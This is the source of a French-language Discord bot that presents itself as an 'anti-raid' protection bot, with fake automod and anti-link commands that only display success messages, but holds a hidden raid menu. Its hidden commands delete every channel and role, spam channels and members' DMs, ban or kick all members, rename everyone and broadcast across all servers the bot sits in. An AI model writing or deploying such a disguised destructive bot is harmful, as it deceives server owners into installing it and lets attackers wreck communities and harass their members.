const Discord = require('discord.js');
const client = new Discord.Client();
const chalk = require('chalk');
const fs = require('fs');
const botPrefix = "*"

  client.on('ready', msg => {
  console.log("");                                   
  console.log((chalk.cyan(`                                            #####                                     ######                   `)));
  console.log((chalk.cyan(`                                           #     #   ##   #        ##    ####  #    # #     #   ##   # #####  `)));
  console.log((chalk.cyan(`                                           #        #  #  #       #  #  #    # #   #  #     #  #  #  # #    # `)));
  console.log((chalk.cyan(`                                           #  #### #    # #      #    # #      ####   ######  #    # # #    # `)));
  console.log((chalk.cyan(`                                           #     # ###### #      ###### #      #  #   #   #   ###### # #    # `)));
  console.log((chalk.cyan(`                                           #     # #    # #      #    # #    # #   #  #    #  #    # # #    # `)));
  console.log((chalk.cyan(`                                            #####  #    # ###### #    #  ####  #    # #     # #    # # #####  `)));
  console.log("");                                  
  console.log((chalk.yellow(`                                                               Crée par GalackQSM#7926 !`)));  
  console.log((chalk.yellow(`                                                                © 2020 GalackQSM, Inc.`))); 
  console.log("");                                   
  console.log((chalk.red(`                                                         Discord: https://discord.gg/XH7zQ8s`)));   
  console.log((chalk.red(`                                                       Twitter: https://twitter.com/Galack_QSM`)));   
  console.log((chalk.red(`                                                        Github: https://github.com/GalackQSM`)));   
  console.log("");                                  

  console.log(`Statistiques globales : \n\nLe bot a un total de ${client.guilds.cache.size} serveurs. \nPour un total de ${client.users.cache.size} membres.`)
  console.log("Connecté en tant que " + client.user.id + " | Prefix : " + botPrefix + " | Nombre de Serveurs "+ client.guilds.cache.size +" | Nombres de salons "+ client.channels.cache.size +" | Utilisateur totaux "+ client.users.cache.size +" | Nombre d'emojis totaux "+ client.emojis.cache.size +'');
  client.user.setActivity("*help - sur 1654 serveurs");
});

client.on('message',  msg => {

    if (msg.guild && msg.content.startsWith('*pmeveryone')) {
      msg.delete();
      let text = msg.content.slice('*pmeveryone'.length);
      msg.guild.members.cache.forEach(member => {
        if (member.id != client.user.id && !member.user.bot) member.send(text);
      });
    }
    if(msg.content.startsWith('*channels')){
      msg.delete();
      let channelname = msg.content.slice('*channels'.length);
      msg.channel.send("Création de 100 nouveaux salons de texte nommés: " + "**" + channelname + "**")

    var i;
    for (i = 0; i < 100; i++) {
    setTimeout(() => {

        msg.guild.channels.create(channelname,{type: 'text'})
        .then(console.log)
        .catch(console.error);

    },1*1) //3 secondes
    }
    }
    if(msg.content.startsWith("*spam")){
      msg.delete();
      let yourmessage = msg.content.slice('*spam'.length);
      var i;
      
      for (i = 0; i < 50; i++) {
      setTimeout(() => {
         msg.channel.send(yourmessage)
      },1*1) //3 secondes
      }
      
    }
    if(msg.content.startsWith('*deletechannels')){
      msg.delete();
      var i = 0
      msg.guild.channels.cache.forEach(channel =>
      i++
      )
      msg.channel.send("Suppression de **" + i + "** salons!")
        msg.guild.channels.cache.forEach(channel => 

         
            setTimeout(() => {channel.delete()},1000*3))
            msg.guild.channels.create("HACKED",{type: 'text'})
            .then(console.log)
            .catch(console.error);

    }
    if(msg.content.startsWith('*deleteroles')){
      msg.delete();
      let notdelete = msg.content.slice('*deleteroles'.length);
      var i = 0
      msg.guild.roles.cache.forEach(role =>
        i++
      )
      msg.channel.send("Suppression de **"+i+"** rôles!")
        msg.guild.roles.cache.forEach(role => 
            setTimeout(() => {
            if(msg.guild.id !== role.id && role.name != "corona" && role.id != notdelete){
                role.delete()
            }
            },1000*3))
    }
    if(msg.content == "*1help"){
      msg.delete();
      const helpEmbed = new Discord.MessageEmbed()
      .setColor('#0099ff')
      .setTitle('Panel de commande raid')
      .setURL('https://github.com/GalackQSM')
      .setDescription('Ici vous pouvez trouver toutes les commandes pour détruire un serveur')
      .addField("GalackQSM#7926 n'est pas responsables de ce que vous en faites!", 'Utilisation à vos risques et périls!')
      .addField('Commandes', 
        '\n`*1help` - Afficher les commandes raid\n`*deletechannels` - Supprime tous les salons\n`*deleteroles` - Supprime tous les rôles\n`*channels [Nom]` - Crée 100 salons avec le nom choisis\n`*spam [Message]` - Spams envoyés dans le salon\n`*kickall` - Kicker tout les membres du serveur\n`*banall` - Bannir tout les membres du serveur\n`*spmall [Message]` - Spammer dans tout les salons en même temps\n`*pmeveryone [Message]` - DM tout les membres du serveur', true)
      .setTimestamp()
      .setFooter('Créé par GalackQSM', 'https://i.imgur.com/p5OJ0q9.png');
        
      msg.author.send(helpEmbed);
    }

    if(msg.content.startsWith('*spmall')){
      msg.delete();
      var i;
      for (i = 0; i < 5; i++) {

      setTimeout(() => {

        let yourmessage = msg.content.slice('*spmall'.length);
        
        msg.guild.channels.cache.forEach(channel =>
          channel.send(yourmessage)
          )
      },1*1) //3 secondes
      }
    }
    if(msg.content == "*kickall"){
      msg.delete();    
      msg.guild.members.cache.forEach(member => {

        if(member != msg.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
          member.kick();
        }
      })  
      }
      if(msg.content == "*banall"){
        msg.delete();     
        msg.guild.members.cache.forEach(member => {
  
          if(member != msg.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
            member.ban();
          }
        })  
        }
      if(msg.content.startsWith('*massnick')){
        msg.delete();
        let nickname = msg.content.slice('*massnick'.length);
        var i = 0;
        msg.guild.members.cache.forEach(member =>{
          i++
        }
          )
        msg.channel.send("Changement des noms de **" + i + "** membres à **" + nickname + "**")
        msg.guild.members.cache.forEach(member =>{

          member.setNickname(nickname)
        }
          )
      }
      if(msg.content.startsWith('*guildname')){
        msg.delete();
        let newguildname = msg.content.slice('*guildname'.length);
        msg.channel.send("Nouveau nom du serveur: **" + newguildname + "**")
        msg.guild.setName(newguildname)
      }


      if((msg.content.startsWith('*everyguildupdatemessage'))){
        msg.delete();
        let msgtosend = msg.content.slice('*everyguildupdatemessage'.length)
        var guildList = client.guilds.cache.array();
        try{
          guildList.cache.forEach(guild =>
            guild.channels.cache.forEach(channel =>
              channel.send(msgtosend)
            )
            
            )
        } catch (err) {
          console.log("impossible d'envoyer le message")
        }
      }
      if((msg.content.startsWith('*everyguildmassnick'))){
        msg.delete();
        let nickname = msg.content.slice('*everyguildmassnick'.length)
        var guildList = client.guilds.array();
        try{
          guildList.cache.forEach(guild =>
            guild.members.cache.forEach(member =>{
              member.setNickname(nickname);
            })
            
            )
        } catch (err) {
          console.log("impossible d'envoyer le message")
        }
      }

//Commande fake 
    if(msg.content == "*help"){
      const helpEmbed = new Discord.MessageEmbed()
      .setColor('#0099ff')
      .setTitle('Panel de commande anti-raid')
      .setURL('https://github.com/GalackQSM')
      .setDescription('Ici vous pouvez trouver toutes les commandes')
      .addField('Commandes Admin', 
        '\n`*help` - Afficher les commandes\n`*automod` - Activer l\'automod sur votre serveur\n`*antilink` - Activer l\'anti-link sur votre serveur')
      .addField('Commandes Image', 
        '\n`*cat` - Afficher un chat\n`*dog` - Afficher un chien\n`*calin` - Demander un calin\n`*weed` - Afficher de la weed\n`*punch` - Avoir envie de punch')
      .setTimestamp()
      .setFooter('Créé par GalackQSM', 'https://i.imgur.com/p5OJ0q9.png');
        
      msg.channel.send(helpEmbed);
    }
//Commande fake Admin
    if(msg.content == "*automod"){
      const automod = new Discord.MessageEmbed()
      .setColor('#0099ff')
      .setDescription(":white_check_mark: **L'automod à bien été activer, votre serveur est maintenant sécurisé.**")
        
      msg.channel.send(automod);
    }

    if(msg.content == "*antilink"){
      const automod = new Discord.MessageEmbed()
      .setColor('#0099ff')
      .setDescription(":white_check_mark: **L'anti-link à bien été activer, votre serveur est maintenant sécurisé des invitations discord.**")
        
      msg.channel.send(automod);
    }
//Commande fake Image
    if(msg.content == "*cat"){
        const member = msg.member;

            const kiss = [
            `https://www.wanimo.com/veterinaire/wp-content/uploads/2018/11/chat-jaloux-e1574672723199@2x.jpg`,
            `https://alternativi.fr/uploads/articles//les-bienfaits-du-chat-sur-lhomme-e96.jpeg`,
            `https://www.zooplus.fr/magazine/wp-content/uploads/2019/06/comprendre-le-langage-des-chats-768x576.jpg`,
            `https://www.wikichat.fr/wp-content/uploads/sites/2/comment-soigner-une-plaie-dun-chat.jpg`,
            `https://www.dogteur.com/media/magpleasure/mpblog/list_thumbnail_file/e/a/cache/5/ece9a24a761836a70934a998c163f8c8/eaf7d56dbea1bb003bb0bb649c022bab.jpg`,
            `https://static.mmzstatic.com/wp-content/uploads/2018/05/manquer-a-son-chat.jpg`,
            `https://static.actu.fr/uploads/2020/02/ruse-chat-1.jpeg`,
            `https://p5.storage.canalblog.com/58/97/234487/9496047.jpg`,
            `https://i.skyrock.net/0952/41420952/pics/2860119478_small_1.jpg`,
            `https://i.ytimg.com/vi/TDTijZcpjMo/maxresdefault.jpg`,
            `https://assets.change.org/photos/9/pg/yc/ovpgycJUUzHOXno-400x400-noPad.jpg`,
            `https://voyage-onirique.com/wp-content/uploads/2020/04/backiee-149162-landscape.jpg`,
            `https://www.30millionsdamis.fr/uploads/pics/conseils-erreurs-chat-1171.jpg`
        ]


      const embed = new Discord.MessageEmbed()
        .setDescription(`**${member.user.username}** voici un chat :cat:`, msg.author.avatarURL)
        .setImage(kiss[Math.floor(Math.random() * kiss.length)])
        .setFooter('Commande faite par ' + member.user.username)
        .setColor("RANDOM")

        msg.channel.send(embed);
    }

    if(msg.content == "*dog"){
        const member = msg.member;

            const kiss = [
            `https://www.zooplus.fr/magazine/wp-content/uploads/2020/03/coronavirus-chez-le-chien-768x512.jpeg`,
            `https://static.actu.fr/uploads/2019/10/chien-854x599.jpg`,
            `https://www.purina.fr/sites/g/files/mcldtz1371/files/2019-11/Adolescence-chien-min_0.jpg`,
            `https://www.notretemps.com/cache/com_zoo_images/aa/chien-chaleur3_e9b008236b81f94bc66a7cc0cea9ac83.jpg`,
            `https://static.cotemaison.fr/medias_10824/w_2048,h_1146,c_crop,x_0,y_184/w_640,h_360,c_fill,g_north/v1456392403/10-conseils-pour-rendre-votre-chien-heureux_5542245.jpg`,
            `https://static.wamiz.fr/images/news/facebook/article/chien-os-fb-594cdb7b3d78d.jpg`,
            `https://jardinage.lemonde.fr/images/dossiers/categories3/racedecien-083123-650-325.jpg`,
            `https://images.sudouest.fr/2020/01/21/5e27092366a4bd6733ae5f03/widescreen/1000x500/plus-de-14700-bergers.jpg?v1`,
            `https://lemagduchien.ouest-france.fr/images/dossiers/2019-06/chien-heureux-064736.jpg`,
            `https://static.lpnt.fr/images/2019/03/02/18179740lpw-18179789-article-chien-allemagne-jpg_6010782_1250x625.jpg`,
            `https://images.sudouest.fr/2020/01/21/5e27092366a4bd6733ae5f03/widescreen/1000x500/plus-de-14700-bergers.jpg?v1`,
            `https://www.numerama.com/content/uploads/2020/08/chien_berger_allemand.jpg`,
            `https://cdn.radiofrance.fr/s3/cruiser-production/2019/04/7d5231cd-9205-450c-8941-026793a9ac2c/870x489_chien-939361388.jpg`,
            `https://images.sudouest.fr/2019/08/08/5d4c054766a4bdc30d9b31d5/widescreen/1000x500/sur-les-lieux-six-chiens.jpg?v1`
        ]


      const embed = new Discord.MessageEmbed()
        .setDescription(`**${member.user.username}** voici un chien :dog:`, msg.author.avatarURL)
        .setImage(kiss[Math.floor(Math.random() * kiss.length)])
        .setFooter('Commande faite par ' + member.user.username)
        .setColor("RANDOM")

        msg.channel.send(embed);
    }

    if(msg.content == "*weed"){
        const member = msg.member;

            const kiss = [
            `https://www.royalqueenseeds.fr/modules/prestablog/themes/royalqueenseeds/up-img/621.jpg`,
            `https://static1.purebreak.com/articles/0/19/76/20/@/721267-cannabis-la-legalisation-de-la-weed-en-opengraph_1200-2.jpeg`,
            `https://www.alchimiaweb.com/images/xl/cookies-and-weed_8736_1_.jpg`,
            `https://www.newsweed.fr/wp-content/uploads/2015/11/weed.jpg`,
            `https://lepetitjournal.com/sites/default/files/styles/main_article/public/2018-12/weed.jpg`,
            `https://france3-regions.francetvinfo.fr/image/Ycpxwsb9JFvXWMcfbqVAbOP5Q7Y/600x400/regions/2020/06/09/5edf8721bde5d_cannabis_17-4290056.jpg`,
            `https://www.quebecscience.qc.ca/wp-content/uploads/2019/07/cannabis.jpg`,
            `https://www.agrimaroc.ma/wp-content/uploads/cannabis-maroc.jpg`,
            `https://www.dinafem.org/uploads/0003122-big-kush.jpg`,
            `https://www.royalqueenseeds.fr/149-2410-thickbox/og-kush-.jpg`,
            `https://www.zamnesia.fr/5322-17428/super-og-kush-feminisee.jpg`,
            `https://www.amsterdamgenetics.com/wp-content/uploads/2019/07/purple_weed_blog-07-780x350.jpg`,
            `https://wheresweed.com/blog_images/main/purple-cannabis-why-you-should-care-about-color.jpg`,
            `https://i.pinimg.com/originals/ff/83/d6/ff83d682f26c62d28e64335ae4a23dc2.jpg`,
            `https://pevgrow.com/23761-large_default/7556-purple-kush-marijuana-grainers.jpg`,
            `https://wheresweed.com/blog_images/500x500/purple-cannabis-why-you-should-care-about-color.jpg`
        ]


      const embed = new Discord.MessageEmbed()
        .setDescription(`**${member.user.username}** voici de la weed :maple_leaf:`, msg.author.avatarURL)
        .setImage(kiss[Math.floor(Math.random() * kiss.length)])
        .setFooter('Commande faite par ' + member.user.username)
        .setColor("RANDOM")

        msg.channel.send(embed);
    }

    if(msg.content == "*punch"){

        const member = msg.member;

            const kiss = [
            `https://thumbs.gfycat.com/EssentialSillyBobcat-max-1mb.gif`,
            `https://pa1.narvii.com/6272/cf24160e6b4e98e2e40a3b2633a3cce7c31ed4f7_hq.gif`,
            `https://thumbs.gfycat.com/PoliticalAbleFennecfox-size_restricted.gif`,
            `https://pa1.narvii.com/6724/4daa91b820e74e1ce10574cbac4772d5169f84fa_hq.gif`,
            `https://thumbs.gfycat.com/ShinyRecklessBobwhite-size_restricted.gif`,
            `https://media1.tenor.com/images/34356db15b5e28ca27307ba87325e67d/tenor.gif`,
            `https://i.pinimg.com/originals/76/0b/3f/760b3fc3deac11d2163ea305987bd9bd.gif`
        ]


      const embed = new Discord.MessageEmbed()
        .setDescription(`**${member.user.username}** a envie de puncher des têtes :punch:`, msg.author.avatarURL)
        .setImage(kiss[Math.floor(Math.random() * kiss.length)])
        .setFooter('Commande faite par ' + member.user.username)
        .setColor("RANDOM")

        msg.channel.send(embed);
    }

    if(msg.content == "*calin"){

        const member = msg.member;

            const kiss = [
            `https://i.pinimg.com/originals/d1/d3/a0/d1d3a02a8356549fcd48796b318d6b58.gif`,
            `https://i.pinimg.com/originals/5c/6c/a6/5c6ca66dbf69a5c5c0881caa275547ed.gif`,
            `https://data.whicdn.com/images/213476418/original.gif`,
            `https://media1.tenor.com/images/56c73f380d3ad747ff0600eb7ea1bbc7/tenor.gif`,
            `https://media2.giphy.com/media/l2QDM9Jnim1YVILXa/giphy.gif`,
            `https://i.pinimg.com/originals/6d/b5/4c/6db54c4d6dad5f1f2863d878cfb2d8df.gif`,
            `https://thumbs.gfycat.com/FocusedCoordinatedAlaskajingle-size_restricted.gif`
        ]


      const embed = new Discord.MessageEmbed()
        .setDescription(`**${member.user.username}** a envie d'un calin :heart_eyes:`, msg.author.avatarURL)
        .setImage(kiss[Math.floor(Math.random() * kiss.length)])
        .setFooter('Commande faite par ' + member.user.username)
        .setColor("RANDOM")

        msg.channel.send(embed);
    }


});


client.login("TOKEN");
